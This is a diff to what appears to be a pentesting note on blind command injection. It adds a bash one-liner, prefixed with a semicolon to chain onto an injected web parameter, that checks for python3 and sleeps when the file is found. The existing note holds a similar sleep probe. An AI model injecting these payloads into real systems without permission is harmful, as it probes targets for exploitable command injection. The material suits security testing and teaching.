@@ -4,6 +4,12 @@ Testing for blind command injection
 
 If you suspect a web parameter is vulnerable to command injection but the response is not reflecting any commands injected, test with sleep condition.  
 
+### Bash IF Condition example - validation of oneliner execution before testing on target
+```bash
+;if [ -f /usr/bin/python3 ]; then echo "FILE FOUND" && sleep 10; else echo "FILE NOT FOUND" && sleep 0; fi
+```
+![bash](bash.png)
+
 ### Bash oneliner if condition test command is going to wait for 10 seconds sleep if file does exist on the target.
 ```bash
 ;if [ -f /usr/bin/python3 ]; then sleep 10; else sleep 0; fi
